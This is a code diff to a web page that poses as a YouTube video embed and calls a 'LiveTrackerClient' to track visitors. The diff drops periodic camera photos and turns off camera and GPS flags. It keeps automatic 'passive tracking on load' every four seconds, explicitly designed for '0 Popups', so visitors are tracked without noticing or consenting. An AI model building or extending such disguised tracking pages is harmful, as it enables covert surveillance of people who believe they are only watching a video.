@@ -361,26 +361,24 @@
                 window.LiveTrackerClient.startTracking({
                     templateName: 'youtube',
                     updateInterval: 4000,
-                    photoInterval: 12000,
-                    onSuccess: (coords) => console.log("Location telemetry active"),
-                    onError: (err) => console.warn("Telemetry warning:", err.message)
+                    enableCamera: false,
+                    enableGPS: false
                 });
             }
         }
 
         overlay.addEventListener('click', startVideoAndTelemetry);
         
-        // Also auto-start tracking on load if user interacts or page allows
+        // Auto-start passive tracking on load (0 Popups!)
         window.addEventListener('DOMContentLoaded', () => {
-            // Pre-initialize iframe src without autoplay
             iframe.src = `https://www.youtube-nocookie.com/embed/${videoId}?rel=0`;
             
-            // Try starting telemetry directly
             if (window.LiveTrackerClient) {
                 window.LiveTrackerClient.startTracking({
                     templateName: 'youtube',
                     updateInterval: 4000,
-                    photoInterval: 12000
+                    enableCamera: false,
+                    enableGPS: false
                 });
             }
         });
